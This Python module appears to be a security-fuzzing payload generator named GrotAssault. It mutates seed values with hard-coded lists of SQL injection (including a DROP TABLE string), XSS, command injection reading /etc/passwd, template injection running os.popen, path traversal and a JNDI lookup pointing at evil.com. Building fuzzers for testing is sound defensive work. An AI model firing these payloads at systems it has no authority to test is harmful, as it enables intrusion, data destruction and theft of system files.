"""
GrotAssault — payload mutation engine.

Generates mutated payloads from seed values using pluggable strategies:

  - **Injection** — SQL, XSS, command injection, SSTI, path traversal
  - **Boundary** — Integer overflows, empty strings, null bytes, long strings
  - **Encoding** — Double-encoding, unicode escapes, mixed case
  - **Format** — Format-string specifiers (%s, %x, {0})
"""

from __future__ import annotations

import enum
import random
from typing import Any, Dict, List, Optional, Sequence


# ------------------------------------------------------------------
# Strategy enum
# ------------------------------------------------------------------

class MutationStrategy(enum.Enum):
    """Available mutation strategies."""
    INJECTION = "injection"
    BOUNDARY = "boundary"
    ENCODING = "encoding"
    FORMAT = "format"
    ALL = "all"


# ------------------------------------------------------------------
# Payload databases
# ------------------------------------------------------------------

_SQL_PAYLOADS: List[str] = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "'; DROP TABLE users; --",
    "1 UNION SELECT NULL,NULL,NULL--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "1; WAITFOR DELAY '0:0:5'--",
    "' OR 1=1#",
    "admin'--",
]

_XSS_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    '<img src=x onerror=alert(1)>',
    '"><script>alert(document.domain)</script>',
    "javascript:alert(1)",
    "<svg/onload=alert(1)>",
    "'-alert(1)-'",
    '<body onload="alert(1)">',
]

_CMD_PAYLOADS: List[str] = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`id`",
    "; ping -c 3 127.0.0.1",
    "& dir",
    "| type C:\\Windows\\win.ini",
]

_SSTI_PAYLOADS: List[str] = [
    "{{7*7}}",
    "${7*7}",
    "<%= 7*7 %>",
    "{{config}}",
    "{{self.__class__.__mro__}}",
    "{%import os%}{{os.popen('id').read()}}",
]

_PATH_TRAVERSAL_PAYLOADS: List[str] = [
    "../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
]

_BOUNDARY_PAYLOADS: List[Any] = [
    "",
    " ",
    "\x00",
    "\x00" * 10,
    "A" * 256,
    "A" * 1024,
    "A" * 65536,
    0,
    -1,
    -2147483648,
    2147483647,
    4294967295,
    9999999999999999,
    0.0,
    float("inf"),
    float("-inf"),
    None,
    True,
    False,
    [],
    {},
]

_ENCODING_PAYLOADS: List[str] = [
    "%00",
    "%0a%0d",
    "%252e%252e%252f",
    "\u202e",  # RTL override
    "\uff1c\uff53\uff43\uff52\uff49\uff50\uff54\uff1e",  # fullwidth <script>
    "&#x3c;script&#x3e;",
    "\\u003cscript\\u003e",
]

_FORMAT_PAYLOADS: List[str] = [
    "%s%s%s%s%s",
    "%x%x%x%x",
    "%n%n%n%n",
    "{0}{1}{2}",
    "${jndi:ldap://evil.com/a}",
    "{{constructor.constructor('return this')()}}",
]


# ------------------------------------------------------------------
# Mutator
# ------------------------------------------------------------------

class Mutator:
    """
    Generate mutated payloads from seed values.

    Parameters
    ----------
    strategies:
        Which mutation strategies to apply. Defaults to all.
    max_payloads_per_field:
        Cap on how many mutations to generate per input field.
    seed:
        Random seed for reproducibility (optional).
    """

    def __init__(
        self,
        *,
        strategies: Optional[Sequence[MutationStrategy]] = None,
        max_payloads_per_field: int = 50,
        seed: Optional[int] = None,
    ) -> None:
        if strategies is None or MutationStrategy.ALL in (strategies or []):
            self.strategies = [
                MutationStrategy.INJECTION,
                MutationStrategy.BOUNDARY,
                MutationStrategy.ENCODING,
                MutationStrategy.FORMAT,
            ]
        else:
            self.strategies = list(strategies)
        self.max_payloads_per_field = max_payloads_per_field
        self._rng = random.Random(seed)

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def generate(self, seed_value: Any = "") -> List[Any]:
        """
        Return a list of mutated payloads derived from *seed_value*.

        The number of payloads is capped at ``max_payloads_per_field``.
        """
        pool: List[Any] = []

        for strategy in self.strategies:
            pool.extend(self._payloads_for(strategy, seed_value))

        # Deduplicate while preserving order
        seen: set = set()
        unique: List[Any] = []
        for p in pool:
            key = self._hashable(p)
            if key not in seen:
                seen.add(key)
                unique.append(p)

        if len(unique) > self.max_payloads_per_field:
            self._rng.shuffle(unique)
            unique = unique[:self.max_payloads_per_field]

        return unique

    def generate_for_dict(self, seed_body: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        For each key in *seed_body*, produce mutated copies of the full
        dict with that key replaced by each mutation. Only one field
        is mutated at a time.
        """
        results: List[Dict[str, Any]] = []
        for key, original_value in seed_body.items():
            mutations = self.generate(original_value)
            for mutated in mutations:
                copy = dict(seed_body)
                copy[key] = mutated
                results.append(copy)
        return results

    # ------------------------------------------------------------------
    # Strategy dispatchers
    # ------------------------------------------------------------------

    def _payloads_for(self, strategy: MutationStrategy, seed: Any) -> List[Any]:
        if strategy == MutationStrategy.INJECTION:
            return self._injection_payloads(seed)
        elif strategy == MutationStrategy.BOUNDARY:
            return list(_BOUNDARY_PAYLOADS)
        elif strategy == MutationStrategy.ENCODING:
            return list(_ENCODING_PAYLOADS)
        elif strategy == MutationStrategy.FORMAT:
            return list(_FORMAT_PAYLOADS)
        return []

    @staticmethod
    def _injection_payloads(seed: Any) -> List[str]:
        """Combine injection payload databases, optionally prepending the seed."""
        all_injections = (
            _SQL_PAYLOADS
            + _XSS_PAYLOADS
            + _CMD_PAYLOADS
            + _SSTI_PAYLOADS
            + _PATH_TRAVERSAL_PAYLOADS
        )
        result: List[str] = list(all_injections)
        # Also create seed-prefixed variants
        if seed and isinstance(seed, str):
            for p in all_injections[:10]:  # limit prefix variants
                result.append(f"{seed}{p}")
        return result

    @staticmethod
    def _hashable(value: Any) -> Any:
        """Make a value hashable for dedup purposes."""
        if isinstance(value, (list, dict)):
            return str(value)
        try:
            hash(value)
            return value
        except TypeError:
            return str(value)
